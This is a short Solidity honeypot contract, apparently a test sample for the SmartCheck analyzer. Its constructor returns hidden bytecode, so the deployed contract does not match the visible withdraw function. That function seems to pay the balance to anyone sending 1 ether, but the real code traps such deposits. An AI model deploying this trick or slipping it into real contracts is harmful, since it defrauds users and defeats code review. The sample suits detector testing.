pragma solidity 0.6.2;

//based on  smartcheck

contract HoneyPot {

    bytes internal constant ID = hex"60203414600857005B60008080803031335AF100";

    constructor () public payable {
        bytes memory contract_identifier = ID;
        //The contract is not fully formed when the constructor is executing. Returning the result in the constructor makes the contract deployment process inconsistent with the intuitive experience.
        assembly { return(add(0x20, contract_identifier), mload(contract_identifier)) }
    }

    function withdraw() public payable {
        require(msg.value >= 1 ether);
        msg.sender.transfer(address(this).balance);
    }
}